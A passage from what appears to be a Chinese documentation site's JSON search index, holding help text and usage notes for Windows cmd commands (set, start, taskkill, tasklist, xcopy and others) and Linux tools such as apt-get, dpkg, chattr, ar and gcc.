\"before\"和\"after\"，这两者永远不会相等。 同样，以下这个例子也不会达到预期效果: set LIST=\nfor% i in (*) do set LIST=%LIST%%i\necho%LIST% 原因是，它不会在目前的目录中建立一个文件列表，而只是将LIST 变量设成找到的最后一个文件。\n这也是因为 %LIST% 在 FOR 语句被读取时，只被扩充了一次；\n而且，那时的 LIST 变量是空的。 因此，我们真正执行的 FOR 循环是: for% i in (*) do set LIST= %i 这个循环继续将 LIST 设成找到的最后一个文件。 延迟环境变量扩充允许你使用一个不同的字符(惊叹号)在执行时间扩充环境变量。\n如果延迟的变量扩充被启用，可以将上面例子写成以下所示，以达到预期效果: set VAR=before\nif \"%VAR%\" == \"before\" (\nset VAR=after\nif \"!VAR!\" == \"after\" @echo If you see this, it worked\n)\n\nset LIST=\nfor% i in (*) do set LIST=!LIST! %i\necho %LIST% 如果命令扩展被启用，有几个动态环境变量可以被扩展，但不会出现在 SET 显示的变\n量列表中。每次变量数值被扩展时，这些变量数值都会被动态计算。如果用户用这些\n名称中任何一个明确定义变量，那个定义会替代下面描述的动态定义: %CD% - 扩展到当前目录字符串。\n\n%DATE% - 用跟 DATE 命令同样的格式扩展到当前日期。\n\n%TIME% - 用跟 TIME 命令同样的格式扩展到当前时间。\n\n%RANDOM% - 扩展到 0 和 32767 之间的任意十进制数字。\n\n%ERRORLEVEL% - 扩展到当前 ERRORLEVEL 数值。\n\n%CMDEXTVERSION% - 扩展到当前命令处理器扩展版本号。\n\n%CMDCMDLINE% - 扩展到调用命令处理器的原始命令行。\n\n%HIGHESTNUMANODENUMBER% - 扩展到此计算机上的最高 NUMA 节点号。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-set.html","loc":"/yq-docs-operating-system-Windows-windows_shell-set.html"},{"title":"setlocal","text":"开始批处理文件中环境改动的本地化操作。在执行 SETLOCAL 之后所做的环境改动只限于批处理文件。\n要还原原先的设置，必须执行 ENDLOCAL。\n达到批处理文件结尾时，对于该批处理文件的每个尚未执行的 SETLOCAL 命令，都会有一个隐含的 ENDLOCAL 被执行。 SETLOCAL 如果启用命令扩展，则 SETLOCAL 更改如下: SETLOCAL 批命令现在可以接受可选参数: ENABLEEXTENSIONS / DISABLEEXTENSIONS\n    启用或禁用命令处理器扩展。这些\n    参数比 CMD /E:ON 或 /E:OFF\n    开关有优先权。请参阅 CMD /? 获取详细信息。\nENABLEDELAYEDEXPANSION / DISABLEDELAYEDEXPANSION\n    启用或禁用延缓环境变量\n    扩展。这些参数比 CMD\n    /V:ON 或 /V:OFF 开关有优先权。请参阅 CMD /? 获取详细信息。 无论在 SETLOCAL 命令之前的设置是什么，这些修改会一直\n生效，直到出现相应的 ENDLOCAL 命令。 在给定参数的情况下，\nSETLOCAL 命令将设置 ERRORLEVEL 值。如果给定两个有效参数中的一个，另一个未给定，\n则该值为零。\n通过以下方法，你可以在批脚本中\n使用此项来确定扩展是否可用: VERIFY OTHER 2>nul\nSETLOCAL ENABLEEXTENSIONS\nIF ERRORLEVEL 1 echo Unable to enable extensions 此方法之所以有效，是因为在 CMD.EXE 的旧版本上，SETLOCAL\n不设置 ERRORLEVEL 值。如果参数不正确，VERIFY 命令会将\nERRORLEVEL 值初始化为非零值。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-setlocal.html","loc":"/yq-docs-operating-system-Windows-windows_shell-setlocal.html"},{"title":"shift","text":"更改批处理文件中可替换参数的位置: SHIFT [/n] 如果命令扩展被启用，SHIFT 命令支持/n 命令行开关；该命令行开关告诉命令从第 n 个参数开始移位；\nn 介于零和八之间。例如: SHIFT /2 会将 %3 移位到 %2，将 %4 移位到 %3，等等；并且不影响 %0 和 %1。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-shift.html","loc":"/yq-docs-operating-system-Windows-windows_shell-shift.html"},{"title":"start","text":"启动一个单独的窗口以运行指定的程序或命令: START [\"title\"] [/D path] [/I] [/MIN] [/MAX] [/SEPARATE | /SHARED]\n      [/LOW | /NORMAL | /HIGH | /REALTIME | /ABOVENORMAL | /BELOWNORMAL]\n      [/NODE <NUMA node>] [/AFFINITY <hex affinity mask>] [/WAIT] [/B]\n      [command/program] [parameters] 选项/参数说明: \"title\"     在窗口标题栏中显示的标题。\npath        启动目录。\nB           启动应用程序，但不创建新窗口。\n            应用程序已忽略 &#94;C 处理。除非应用程序\n            启用 &#94;C 处理，否则 &#94;Break 是唯一可以中断\n            该应用程序的方式。\nI           新的环境将是传递\n            给 cmd.exe 的原始环境，而不是当前环境。\nMIN         以最小化方式启动窗口。\nMAX         以最大化方式启动窗口。\nSEPARATE    在单独的内存空间中启动 16 位 Windows 程序。\nSHARED      在共享内存空间中启动 16 位 Windows 程序。\nLOW         在 IDLE 优先级类中启动应用程序。\nNORMAL      在 NORMAL 优先级类中启动应用程序。\nHIGH        在 HIGH 优先级类中启动应用程序。\nREALTIME    在 REALTIME 优先级类中启动应用程序。\nABOVENORMAL 在 ABOVENORMAL 优先级类中启动应用程序。\nBELOWNORMAL 在 BELOWNORMAL 优先级类中启动应用程序。\nNODE        将首选非一致性内存结构(NUMA)节点指定为\n            十进制整数。\nAFFINITY    将处理器关联掩码指定为十六进制数字。\n            进程被限制在这些处理器上运行。\n\n            将 /AFFINITY 和 /NODE 结合使用时，会对关联掩码\n            进行不同的解释。指定关联掩码，以便将零位作为起始位置(就如将 NUMA\n            节点的处理器掩码向右移位一样)。\n            进程被限制在指定关联掩码和 NUMA 节点之间的\n            那些通用处理器上运行。\n            如果没有通用处理器，则进程被限制在\n            指定的 NUMA 节点上运行。\nWAIT        启动应用程序并等待它终止。\ncommand/program\n            如果它是内部 cmd 命令或批文件，则\n            该命令处理器是使用 cmd.exe 的 /K 开关运行的。\n            这表示运行该命令之后，该窗口\n            将仍然存在。\n\n            如果它不是内部 cmd 命令或批文件，则\n            它就是一个程序，并将作为一个窗口化应用程序或\n            控制台应用程序运行。\n\nparameters  这些是传递给 command/program 的参数。 注意: 在 64 位平台上不支持 SEPARATE 和 SHARED 选项。 通过指定 /NODE，可按照利用 NUMA 系统中的内存区域的方式创建进程。\n例如，可以创建两个完全通过共享内存互相通信的进程以共享相同的首选 NUMA 节点，从而最大限度地减少内存延迟。\n只要有可能，它们就会分配来自相同 NUMA 节点的内存，并且会在指定节点之外的处理器上自由运行: start /NODE 1 application1.exe\nstart /NODE 1 application2.exe 这两个进程可被进一步限制在相同 NUMA 节点内的指定处理器上运行。\n在以下示例中，application1 在节点的两个低位处理器上运行，而 application2在该节点的其后两个处理器上运行。\n该示例假定指定节点至少具有四个逻辑处理器。请注意，节点号可更改为该计算机的任何有效节点号，而无需更改关联掩码: start /NODE 1 /AFFINITY 0x3 application1.exe\nstart /NODE 1 /AFFINITY 0xc application2.exe 如果命令扩展被启用，通过命令行或 START 命令的外部命令调用会如下改变: 将文件名作为命令键入，非可执行文件可以通过文件关联调用。 (例如，WORD.DOC 会调用跟 .DOC 文件扩展名关联的应用程序)。\n关于如何从命令脚本内部创建这些关联，请参阅 ASSOC 和 FTYPE 命令。 执行的应用程序是 32 位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示符。\n如果在命令脚本内执行，该新行为则不会发生。 如果执行的命令行的第一个符号是不带扩展名或路径修饰符的字符串 \"CMD\"，\"CMD\" 会被 COMSPEC 变量的数值所替换。\n这防止从当前目录提取 CMD.EXE。 如果执行的命令行的第一个符号没有扩展名，CMD.EXE 会使用PATHEXT 环境变量的数值来决定要以什么顺序寻找哪些扩展名。\nPATHEXT 变量的默认值是: .COM;.EXE;.BAT;.CMD 请注意，该语法跟 PATH 变量的一样，分号隔开不同的元素。 查找可执行文件时，如果没有相配的扩展名，看一看该名称是否与目录名相配。\n如果确实如此，START 会在那个路径上调用Explorer。\n如果从命令行执行，则等同于对那个路径作 CD /D。 批处理中调用外部程序的命令（该外部程序在新窗口中运行，批处理程序继续往下执行，不理会外部程序的运行状况），\n如果直接运行外部程序则必须等外部程序完成后才继续执行剩下的指令 例: start explorer d:\\ 调用图形界面打开D盘 有一类似指令 call 与区别, 见 call 注意: 有时候使用 start 启动时候无效: start \"C:\\user xx\\xx.bat\" 是因为有个 title 参数, 这时候加个空标题即可: start \"\" \"C:\\user xx\\xx.bat\"","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-start.html","loc":"/yq-docs-operating-system-Windows-windows_shell-start.html"},{"title":"taskkill","text":"类似 linux 的 kill 使用该工具按照进程 ID (PID) 或映像名称终止任务: TASKKILL [/S system [/U username [/P [password]]]]\n        { [/FI filter] [/PID processid | /IM imagename] } [/T] [/F] 参数列表: /S    system           指定要连接的远程系统。\n\n/U    [domain\\]user    指定应该在哪个用户上下文执行这个命令。\n\n/P    [password]       为提供的用户上下文指定密码。如果忽略，提示\n                       输入。\n\n/FI   filter           应用筛选器以选择一组任务。\n                       允许使用 \"*\"。例如，映像名称 eq acme*\n\n/PID  processid        指定要终止的进程的 PID。\n                       使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n/?                     显示帮助消息。 筛选器 filter: 筛选器名      有效运算符                有效值\n-----------   ---------------           -------------------------\nSTATUS        eq, ne                    RUNNING |\n                                        NOT RESPONDING | UNKNOWN\nIMAGENAME     eq, ne                    映像名称\nPID           eq, ne, gt, lt, ge, le    PID 值\nSESSION       eq, ne, gt, lt, ge, le    会话编号。\nCPUTIME       eq, ne, gt, lt, ge, le    CPU 时间，格式为\n                                        hh:mm:ss。\n                                        hh - 时，\n                                        mm - 分，ss - 秒\nMEMUSAGE      eq, ne, gt, lt, ge, le    内存使用量，单位为 KB\nUSERNAME      eq, ne                    用户名，格式为 [domain\\]user\nMODULES       eq, ne                    DLL 名称\nSERVICES      eq, ne                    服务名称\nWINDOWTITLE   eq, ne                    窗口标题\n\n说明\n----\n1) 只有在应用筛选器的情况下，/IM 切换才能使用通配符 '*'。\n2) 远程进程总是要强行 (/F) 终止。\n3) 当指定远程机器时，不支持 \"WINDOWTITLE\" 和 \"STATUS\" 筛选器。 例如: TASKKILL /IM notepad.exe\nTASKKILL /PID 1230 /PID 1241 /PID 1253 /T\nTASKKILL /F /IM cmd.exe /T\nTASKKILL /F /FI \"PID ge 1000\" /FI \"WINDOWTITLE ne untitle*\"\nTASKKILL /F /FI \"USERNAME eq NT AUTHORITY\\SYSTEM\" /IM notepad.exe\nTASKKILL /S system /U 域\\用户名 /FI \"用户名 ne NT*\" /IM *\nTASKKILL /S system /U username /P password /FI \"IMAGENAME eq note*\" 强制终止掉指定名称的进程\n(/IM表示进程名, /F强制终止): taskkill /IM process_name.exe /F","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-taskkill.html","loc":"/yq-docs-operating-system-Windows-windows_shell-taskkill.html"},{"title":"tasklist","text":"查看所有进程, 想找类似与linux下 ps 时找到的: PS C:\\Users\\yanque> tasklist\n\n映像名称                       PID 会话名              会话#       内存使用\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          8 K\nSystem                           4 Services                   0      3,568 K\nRegistry                       268 Services                   0     55,028 K\nsmss.exe                       936 Services                   0      1,032 K\ncsrss.exe                     1212 Services                   0      6,520 K\nwininit.exe                   1312 Services                   0      6,996 K\nservices.exe                  1384 Services                   0     10,852 K\nlsass.exe                     1408 Services                   0     28,764 K\nsvchost.exe                   1528 Services                   0     31,748 K\nfontdrvhost.exe               1556 Services                   0      2,976 K 查看帮助: C:\\Users\\烟雀>tasklist /? 语法: TASKLIST [/S system [/U username [/P [password]]]]\n         [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH] 描述: 该工具显示在本地或远程机器上当前运行的进程列表。 参数列表: /S system           指定连接到的远程系统。 /U [domain]user    指定应该在哪个用户上下文执行这个命令。 /P [password]       为提供的用户上下文指定密码。如果省略，则\n提示输入。 /M [module]         列出当前使用所给 exe/dll 名称的所有任务。\n如果没有指定模块名称，显示所有加载的模块。 /SVC 显示每个进程中主持的服务。 /APPS 显示 Microsoft Store 应用及其关联的进程。 /V 显示详细任务信息。 /FI filter           显示一系列符合筛选器\n指定条件的任务。 /FO format           指定输出格式。\n有效值: \"TABLE\"、\"LIST\"、\"CSV\"。 /NH 指定列标题不应该\n在输出中显示。\n只对 \"TABLE\" 和 \"CSV\" 格式有效。 /?                      显示此帮助消息。 筛选器: 筛选器名称        有效运算符                  有效值\n-----------     ---------------           --------------------------\nSTATUS          eq, ne                    RUNNING | SUSPENDED\n                                          NOT RESPONDING | UNKNOWN\nIMAGENAME       eq, ne                    映像名称\nPID             eq, ne, gt, lt, ge, le    PID 值\nSESSION         eq, ne, gt, lt, ge, le    会话编号\nSESSIONNAME     eq, ne                    会话名称\nCPUTIME         eq, ne, gt, lt, ge, le    CPU 时间，格式为\n                                          hh:mm:ss。\n                                          hh - 小时，\n                                          mm - 分钟，ss - 秒\nMEMUSAGE        eq, ne, gt, lt, ge, le    内存使用(以 KB 为单位)\nUSERNAME        eq, ne                    用户名，格式为\n                                          [域\\]用户\nSERVICES        eq, ne                    服务名称\nWINDOWTITLE     eq, ne                    窗口标题\n模块         eq, ne                    DLL 名称 注意: 当查询远程计算机时，不支持 \"WINDOWTITLE\" 和 \"STATUS\" 筛选器。 Examples: TASKLIST\nTASKLIST /M\nTASKLIST /V /FO CSV\nTASKLIST /SVC /FO LIST\nTASKLIST /APPS /FI \"STATUS eq RUNNING\"\nTASKLIST /M wbem*\nTASKLIST /S system /FO LIST\nTASKLIST /S system /U 域\\用户名 /FO CSV /NH\nTASKLIST /S system /U username /P password /FO TABLE /NH\nTASKLIST /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" /FI \"STATUS eq running\"","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-tasklist.html","loc":"/yq-docs-operating-system-Windows-windows_shell-tasklist.html"},{"title":"title","text":"语法: title [string] 表示设置 cmd 窗口的标题为 string","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-title.html","loc":"/yq-docs-operating-system-Windows-windows_shell-title.html"},{"title":"tskill","text":"类似 linux 的 kill, 低配版的 taskkill 结束进程: TSKILL processid | processname [/SERVER:servername] [/ID:sessionid | /A] [/V]\n\n  processid           要结束的进程的 Process ID。\n  processname         要结束的进程名称。\n  /SERVER:servername  含有 processID 的服务器(默认值是当前值)。\n                        使用进程名和 /SERVER 时，必须指定 /ID\n                        或 /A\n  /ID:sessionid       结束在指定会话下运行的进程。\n  /A                  结束在所有会话下运行的进程。\n  /V                  显示正在执行的操作的信息。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-tskill.html","loc":"/yq-docs-operating-system-Windows-windows_shell-tskill.html"},{"title":"where","text":"显示符合搜索模式的文件位置。在默认情况下，搜索是在当前目录和 PATH 环境变量指定的路径中执行的 语法: WHERE [/R dir] [/Q] [/F] [/T] pattern... 参数列表: /R       从指定目录开始，递归性搜索并显示符合指定模式的文件。\n\n/Q       只返回退出代码，不显示匹配文件列表。(安静模式)\n\n          匹配文件。(安静模式)\n\n/F       显示所有相配文件并用双引号括上。\n\n/T       显示所有相配文件的文件的文件。\n\npattern  指定要匹配的文件的搜索模式。通配符 * 和 ? 可以用在模式中。\n          也可以指定 \"$env:pattern\" 和 \"path:pattern\" 格式; 其中\n          \"env\" 是环境变量，搜索是在 \"env\" 变量的指定的路径中执行的。\n          这些格式不应该跟 /R 一起使用。此搜索也可以用将 PATHEXT 变\n          量扩展名附加于此模式的方式完成。\n\n  /?      显示此帮助消息。 注意:\n如果搜索成功，此工具返回错误级别 0;\n如果不成功，返回 1;\n如果失败或发生错误，返回 2。 示例: WHERE /?\nWHERE myfilename1 myfile????.*\nWHERE $windir:*.*\nWHERE /R c:\\windows *.exe *.dll *.bat\nWHERE /Q ??.???\nWHERE \"c:\\windows;c:\\windows\\system32:*.dll\"\nWHERE /F /T *.dll","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-where.html","loc":"/yq-docs-operating-system-Windows-windows_shell-where.html"},{"title":"wimic","text":"windows下的一个交互式的命令行环境(类似bash shell之类) 帮助用法如下： 命令行帮助 命令 例子 说明 /? 或 -? 显示所有全局开关和别名的语法 /? class /? 显示某个命令的信息 /? memcache /? 显示某个别名的信息 /? temperature\nget /? 显示别名与动词组合的信息 /?:Full irq\nget /?:Full 显示动词的帮助信息 常用的 查看所有进程: wimic process","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-wimic.html","loc":"/yq-docs-operating-system-Windows-windows_shell-wimic.html"},{"title":"xcopy","text":"复制文件和目录树: XCOPY source [destination] [/A | /M] [/D[:date]] [/P] [/S [/E]] [/V] [/W]\n                          [/C] [/I] [/Q] [/F] [/L] [/G] [/H] [/R] [/T] [/U]\n                          [/K] [/N] [/O] [/X] [/Y] [/-Y] [/Z] [/B] [/J]\n                          [/EXCLUDE:file1[+file2][+file3]...] [/COMPRESS]\n\n  source       指定要复制的文件。\n  destination  指定新文件的位置和/或名称。\n  /A           仅复制有存档属性集的文件，\n                但不更改属性。\n  /M           仅复制有存档属性集的文件，\n                并关闭存档属性。\n  /D:m-d-y     复制在指定日期或指定日期以后更改的文件。\n                如果没有提供日期，则只复制源时间比目标时间新的文件。\n  /EXCLUDE:file1[+file2][+file3]...\n              指定含有字符串的文件列表。每个字符串\n              在文件中应位于单独的一行。如果任何\n              字符串与复制文件的绝对路径的任何部分相符，\n              则排除复制该文件。例如，\n              指定如 \\obj\\ 或 .obj 的字符串会分别\n              排除目录 obj 下面的所有文件或带有\n              .obj 扩展名的所有文件。\n  /P           创建每个目标文件之前均进行提示。\n  /S           复制目录和子目录，不包括空目录。\n  /E           复制目录和子目录，包括空目录。\n                与 /S /E 相同。可以用来修改 /T。\n  /V           验证每个新文件的大小。\n  /W           提示在复制前按键。\n  /C           即使有错误，也继续复制。\n  /I           如果目标不存在，且要复制多个文件，\n                则假定目标必须是目录。\n  /Q           复制时不显示文件名。\n  /F           复制时显示完整的源文件名和目标文件名。\n  /L           显示要复制的文件。\n  /G           允许将加密文件复制到\n                不支持加密的目标。\n  /H           隐藏文件和系统文件也会复制。\n  /R           覆盖只读文件。\n  /T           创建目录结构，但不复制文件。不\n                包括空目录或子目录。/T /E 包括\n                空目录和子目录。\n  /U           只复制已经存在于目标中的文件。\n  /K           复制属性。一般的 Xcopy 会重置只读属性。\n  /N           用生成的短名称复制。\n  /O           复制文件所有权和 ACL 信息。\n  /X           复制文件审核设置(隐含 /O)。\n  /Y           取消提示以确认要覆盖\n                现有目标文件。\n  /-Y          触发提示，以确认要覆盖\n                现有目标文件。\n  /Z           在可重新启动模式下复制网络文件。\n  /B           复制符号链接本身与链接目标。\n  /J           复制时不使用缓冲的 I/O。推荐复制大文件时使用。\n  /COMPRESS    如果适用，在传输期间请求网络\n                压缩。 开关 /Y 可以预先在 COPYCMD 环境变量中设置。\n这可能被命令行上的 /-Y 覆盖。","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-xcopy.html","loc":"/yq-docs-operating-system-Windows-windows_shell-xcopy.html"},{"title":"7z","text":"低版本系统可能非内置指令, 需要手动安装: apt install p7zip 语法: 7z <command> [<switches>...] <archive_name> [<file_names>...][<@listfiles...>] 支持命令(command): a : Add files to archive\nb : Benchmark\nd : Delete files from archive\ne : Extract files from archive (without using directory names)\nh : Calculate hash values for files\ni : Show information about supported formats\nl : List contents of archive\nrn : Rename files in archive\nt : Test integrity of archive\nu : Update files to archive\nx : eXtract files with full paths 选项参数 -r 表示递归解压缩所有的子文件夹 -t <Type> 指定压缩类型, 默认7z。 -o <Directory> 设置解压到的目录 -p <Password> 设置解压缩密码 解压, 例: 7z x xxx.7z","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-7.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-7.html"},{"title":"apt-get","text":"支持的command 语法: apt-get <command> [options] [packages] update - 取回更新的软件包列表信息 upgrade - 进行一次升级 install - 安装新的软件包(注：软件包名称是 libc6 而非 libc6.deb) remove - 卸载软件包 autoremove - 卸载所有自动安装且不再使用的软件包 purge - 卸载并清除软件包的配置 source - 下载源码包文件 build-dep - 为源码包配置所需的编译依赖关系 dist-upgrade - 发布版升级，见 apt-get(8) dselect-upgrade - 根据 dselect 的选择来进行升级 clean - 删除所有已下载的包文件 autoclean - 删除已下载的旧包文件 check - 核对以确认系统的依赖关系的完整性 changelog - 下载指定软件包，并显示其changelog download - 下载指定的二进制包到当前目录 选项参数 -h 本帮助文档。 -q 让输出可作为日志 - 不显示进度 -q q 除了错误外，什么都不输出 -d 仅仅下载 - 【不】安装或解开包文件 -s 不作实际操作。只是依次模拟执行命令 -y 对所有询问都回答是(Yes)，同时不作任何提示 -f 当出现破损的依赖关系时，程序将尝试修正系统 -m 当有包文件无法找到时，程序仍尝试继续执行 -u 显示已升级的软件包列表 -b 在下载完源码包后，编译生成相应的软件包 -V 显示详尽的版本号 -c <config> 读取指定配置文件 -o <config> 设置任意指定的配置选项，例如 -o dir::cache=/tmp 模拟安装: apt-get install -s $soft","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-APT-get.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-APT-get.html"},{"title":"ar","text":"Linux ar命令用于建立或修改备存文件，或是从备存文件中抽取文件。\nar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。 当我们的程序中有经常使用的模块，而且这种模块在其他程序中也会用到，\n这时按照软件重用的思想，我们应该将它们生成库，使得以后编程可以减少开发代码量。 ar命令可以用来创建、修改库，也可以从库中提出单个模块。\n库是一单独的文件，里面包含了按照特定的结构组织起来的其它的一些文件（称做此库文件的member）。\n原始文件的内容、模式、时间戳、属主、组等属性都保留在库文件中。 语法: ar[-dmpqrtx][cfosSuvV][a<成员文件>][b<成员文件>][i<成员文件>][备存文件][成员文件] 参数 必要参数： -d 删除备存文件中的成员文件。 -m 变更成员文件在备存文件中的次序。 -p 显示备存文件中的成员文件内容。 -q 将文件附加在备存文件末端。 -r 将文件插入备存文件中。 -t 显示备存文件中所包含的文件。 -x 自备存文件中取出成员文件。 选项参数： a<成员文件> 将文件插入备存文件中指定的成员文件之后。 b<成员文件> 将文件插入备存文件中指定的成员文件之前。 c 建立备存文件。 f 为避免过长的文件名不兼容于其他系统的ar指令指令，因此可利用此参数，截掉要放入备存文件中过长的成员文件名称。 i<成员文件> 将文件插入备存文件中指定的成员文件之前。 o 保留备存文件中文件的日期。 s 若备存文件中包含了对象模式，可利用此参数建立备存文件的符号表。 S 不产生符号表。 u 只将日期较新文件插入备存文件中。 v 程序执行时显示详细的信息。 V 显示版本信息。 用例: 即可以将 b.o(对象文件) 加入到liba.a中, 即打包为静态库文件: ar -r liba.a b.o 默认的加入方式为append，即加在库的末尾。\"r\"关键字可以有三个修饰符\"a\", \"b\"和\"i\"。 \"a\"表示after，即将新成员加在指定成员之后。例如\"ar -ra a.c liba.a b.c\"表示将b.c加入liba.a并放在已有成员a.c之后； \"b\"表示before，即将新成员加在指定成员之前。例如\"ar -rb a.c liba.a b.c\"; \"i\"表示insert，跟\"b\"作用相同。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-AR.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-AR.html"},{"title":"apt-cache","text":"支持的command depends 查看该软件包需要哪些依赖包 rdepends 查看该软件包被哪些包依赖 列出软件的安装来源 列: apt-cache madison $soft    # 搜索源里面的可用版本\napt-cache policy $sofy    # 比上面那个详细一点\napt-cache showpkg $soft    # 比上一个更详细，还会列出所有相关的\n\n\napt-cache show $soft    # 显示指定包的详情 dpkg -s $soft也可以","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Apt-Cache.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Apt-Cache.html"},{"title":"chattr","text":"Linux chattr命令用于改变文件属性。 这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式： a：让文件或目录仅供附加用途。 b：不更新文件或目录的最后存取时间。 c：将文件或目录压缩后存放。 d：将文件或目录排除在倾倒操作之外。 i：不得任意更动文件或目录, 预防被删除, 也不能更改文件权限。 s：保密性删除文件或目录。 S：即时更新文件或目录。 u：预防被修改。 e: 允许设置拓展属性\n(通过 setfattr 和 getfattr ) 语法: chattr [-RV][-v<版本编号>][+/-/=<属性>][文件或目录...] 选项: -R 递归处理，将指定目录下的所有文件及子目录一并处理。 -v <版本编号> 设置文件或目录版本。 -V 显示指令执行过程。 +<属性> 开启文件或目录的该项属性。 -<属性> 关闭文件或目录的该项属性。 =<属性> 指定文件或目录的该项属性。 实例 用chattr命令防止系统中某个关键文件被修改: chattr +i /etc/resolv.conf\nlsattr /etc/resolv.conf 会显示如下属性: ----i-------- /etc/resolv.conf 让某个文件只能往里面追加数据，但不能删除，适用于各种日志文件: chattr +a /var/log/messages 这就给 file 文件添加了一个自定义的 user.email 扩展属性: chattr +e file\nsetfattr -n user.email -v \"test@example.com\" file\ngetfattr -n user.email file","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Chattr.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Chattr.html"},{"title":"dpkg","text":"debian linux上安装、创建、管理软件包的工具 选项参数 -i <package> , --install <package> 安装软件包 package -r <package> , --remove <package> 删除软件包 -P <package> , --purge <package> 删除软件包的同时删除其配置文件 -L <package> , --listfiles <package> 显示软件包关联的文件 -l 显示已安装软件包列表 --unpack 解开软件包 -c <package> 显示软件包内文件列表 --confiugre <package> 配置软件包 -s <package> , --status <package> 查看软件包信息，是否已安装之类 -S 搜索 --list 查看所有已安装软件包 -b <dir deb_name> 打包软件包, 第一个参数为deb的构建目录, 第二个为包名 --info <package> 查看deb包信息 -x <package dir> 解压deb中所要安装的文件, 第一个参数为所要解压的deb包，第二个参数为将deb包解压到指定的目录\n不过这个只能解出安装文件, desktop等文件解包的用 dpkg-deb -R -e <package> 解压deb中所要安装的文件, 第一个参数为所要解压的deb包，第二个参数为将deb包解压到指定的目录 注解 读取手册使用: man dpkg-query 而不是: man dpkg dpkg -l 结果 dpkg -l 结果结构解析: root@6378b4ca047d:/# dpkg -l\nDesired=Unknown/Install/Remove/Purge/Hold\n| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend\n|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)\n||/ Name                        Version                 Architecture Description\n+++-===========================-=======================-============-===============================================================================\nii  adduser                     3.118ubuntu2            all          add and remove users and groups\nii  apt                         2.0.2                   amd64        commandline package manager 第一列首字母含义 首字母 含义 u 未知 i 安装 r 删除/卸载 p 清除（删除包括配置文件） h ？？？保持？保留？ 第一列第二字母含义 字母 含义 n 未安装 i 安装 c 仅安装配置文件 U 已解压 F 由于某种原因配置失败（半配置） H 由于某种原因安装失败（半安装） W 等待触发器（程序包正在等待另一个程序包的触发器） t 触发挂起（已经触发） 第一列第三字母含义 字母 含义 R 需要重新安装（包损坏 需重装） 如: ii 表示软件正常安装 rc表示软件已卸载，可是配置文件还在，可以通过以下命令进行清理: dpkg -l | grep &#94;rc | cut -d' ' -f3 | sudo xargs dpkg --purg","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-DPKG.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-DPKG.html"},{"title":"pr","text":"将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。 语法: pr(选项)(参数) 选项 -h <标题> 为页指定标题； -l <行数> 指定每页的行数。 参数 文件 需要转换格式的文件。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Deceptive.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Deceptive.html"},{"title":"fg","text":"恢复像被 Ctrl + Z 挂起的进程的执行 使用 jobs 查看后台运行的进程,\n使第 N 个任务在前台运行: fg %N 默认不带%N时表示对最后一个进程操作！","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-France.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-France.html"},{"title":"gcc","text":"详见 gcc(++)编译器 选项 -I <dir> 指定头文件所在目录, 会优先找此处指定的目录 -l <dir> 指定库路径. 指定需要链接的库名，用于告诉链接器需要链接哪些库文件 -L <dir> 指定库文件所在目录 -f no-lto 禁用链接时优化（LTO）\n当使用该选项编译源代码时，编译器将不会进行链接时优化，\n这可能会导致一些性能上的损失，但也可以避免某些链接错误。 注解 -fno-lto 主要用于使用的链接文件是由其他版本LTO的gcc编译时导致无法继续编译时候吧","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-GCC.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-GCC.html"},{"title":"iotop","text":"iotop 一个用来监视磁盘I/O使用状况的top类工具。\niotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。\nLinux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况，\n如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。 iotop使用Python语言编写而成，要求Python2.5（及以上版本）和Linux kernel2.6.20（及以上版本）。\niotop提供有源代码及rpm包，可从其官方主页下载。 选项 -o 只显示有io操作的进程 -b 批量显示，无交互，主要用作记录到文件。 -n NUM 显示NUM次，主要用于非交互式模式。 -d SEC 间隔SEC秒显示一次。 -p PID 监控的进程pid。 -u USER 监控的进程用户。 -t , --time 加上时间戳，非交互非模式 iotop常用快捷键: 